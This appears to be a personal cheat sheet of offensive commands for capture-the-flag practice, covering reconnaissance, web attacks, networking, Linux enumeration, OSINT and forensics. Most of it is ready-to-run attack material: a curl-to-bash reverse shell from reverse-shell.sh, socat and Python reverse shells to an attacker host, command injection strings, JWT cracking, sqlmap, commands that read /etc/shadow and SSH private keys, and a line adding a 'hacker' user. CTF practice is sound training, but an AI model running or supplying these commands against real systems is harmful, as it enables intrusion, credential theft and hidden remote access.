# CTF commands that I can keep and go back to

#### Commands :

```
# Recon:

# Gather bulk information on target like DNS, CERTS, APIs
amass -d IP

# Find ports on IP
nmap -v IP
nmap -sC -sV -A -T4 -p- <target-ip>

# Use the directory search tool
# https://github.com/maurosoria/dirsearch
python3 dirsearch.py -u IP

# Use FFUF for dirtory search
ffuf  -u URL/FUZZ -recursion -w wordlist.txt -mc 200
ffuf -c -w /path/to/wordlist -u http://yahoo.com/FUZZ

#GET Parameter Fuzzing
ffuf -w /path/to/paramnames.txt -u https://target/script.php?FUZZ=test_value -fs 4242

#POST Data Fuzzing
ffuf -w /path/to/postdata.txt -X POST -d "username=admin\&password=FUZZ" -u https://target/login.php -fc 401

# Test connection to a port 
nc -v -v IP PORT




#---------------------------------------------------------------------------------------#




# Web:

# Brute force jtw
hashcat -m 16500 -a 0 jwt.txt rockyou.txt

# XSS payloads 
#https://github.com/payloadbox/xss-payload-list

# SQL map
sqlmap -u "http://example.com/page?id=1" --dbs

# Flask template injection
#https://nvisium.com/resources/blog/2015/12/07/injecting-flask.html 
#https://nvisium.com/resources/blog/2016/03/09/exploring-ssti-in-flask-jinja2.html
#https://nvisium.com/resources/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii.html

# Web fuzzing with FFUF
ffuf -u URL -w "num1.txt:FUZZ1" -w "num2.txt:FUZZ2" -X POST -d "input-1=FUZZ1&input-2=FUZZ2" -H "Content-Type:  application/x-www-form-urlencoded" -r -o output.txt

# Login bypass list
/SecLists/loginBypass.txt

# Add cookie on browser
document.cookie=''

# HTTP servers
python -m SimpleHTTPServer 80
python3 -m http.server
ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => 80, :DocumentRoot => Dir.pwd).start"
php -S $ip:80

# Client side template injection test
{{7*7}}

# Command injection on client side template injection test
;ls
||ls;
|ls;
&&ls;
&ls;
%0Als
`ls`
$(ls)




#---------------------------------------------------------------------------------------#



# Network:

# Ping scan on a range of IP addresses within a specified subnet
nmap -sn IP/24

# Listen on a port with netcat Listen
nc -v -v -n -l -p PORT

# Netcat send to an IP
nc IP PORT < FILE

# Netcat take from the sender
nc -l -p PORT > FILE

# Create tunnel with socat
socat TCP-LISTEN:LOCAL-PORT,fork TCP:TARGET-IP:TARGET-PORT

# PHP reverse shell
#https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php

# Reverse shell
curl https://reverse-shell.sh/URIP:9000 | bash

attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane

export RHOST=”192.168.0.18";export RPORT=4444;python3 -c ‘import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv(“RHOST”),int(os.getenv(“RPORT”))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(“/bin/bash”)'




#---------------------------------------------------------------------------------------#




# Linux:

# Get current user
whoami

# Change user
su username

# What operating System
cat /etc/issue
cat /etc/*-release

# What can be learnt from the environmental variables?
cat /etc/profile
cat /etc/bashrc
cat ~/.bash_profile
cat ~/.bashrc

# Is there a printer?
lpstat -a

# Applications & Services What services are running?
ps aux
ps -ef
top
cat /etc/service
cat /etc/crontab

# Which service(s) are been running by root?
ps aux | grep root
ps -ef | grep root

# Any plain text usernames and/or passwords?
grep -i user [filename]
grep -i pass [filename]
grep -C 5 "password" [filename]
find . -name "*.php" -print0 | xargs -0 grep -i -n "var $password"

# What are the network configuration settings?
cat /etc/resolv.conf
cat /etc/sysconfig/network
cat /etc/networks
iptables -L
hostname
dnsdomainname

# What other users & hosts are communicating with the system?
lsof -i
lsof -i :80
grep 80 /etc/services
netstat -antup
netstat -antpx
netstat -tulpn
chkconfig --list
chkconfig --list | grep 3:on
last
w

# What sensitive files can be found?
cat /etc/passwd
cat /etc/group
cat /etc/shadow
ls -alh /var/mail/

# Can private-key information be found?
cat ~/.ssh/authorized_keys
cat ~/.ssh/identity.pub
cat ~/.ssh/identity
cat ~/.ssh/id_rsa.pub
cat ~/.ssh/id_rsa
cat ~/.ssh/id_dsa.pub
cat ~/.ssh/id_dsa
cat /etc/ssh/ssh_config
cat /etc/ssh/sshd_config
cat /etc/ssh/ssh_host_dsa_key.pub
cat /etc/ssh/ssh_host_dsa_key
cat /etc/ssh/ssh_host_rsa_key.pub
cat /etc/ssh/ssh_host_rsa_key
cat /etc/ssh/ssh_host_key.pub
cat /etc/ssh/ssh_host_key

# Add new user
useradd -p 'openssl passwd -1 <Password>' hacker

# Find sudo programs and check on this site
sudo -l
https://gtfobins.github.io/

# Check the NFS share configuration
cat /etc/exports

# Upgrade shell
python3 -c 'import pty;pty.spawn("/bin/bash");'
CTRL + Z         #backgrounds netcat session
stty raw -echo
fg               #brings netcat session back to the foreground
export TERM=xterm




#---------------------------------------------------------------------------------------#




# Reversing:

# Ghidra debugger




#---------------------------------------------------------------------------------------#




# OSINT

# Google dorking cheatsheet
https://gist.github.com/sundowndev/283efaddbcf896ab405488330d1bbc06

# Sherlock to find usernames across many platforms
sherlock USERNAME

# Tinyeye for reverse image search
https://tineye.com/





#---------------------------------------------------------------------------------------#



#Forensics

# Exif viewer
exiftool <image>

# Autopsy

```
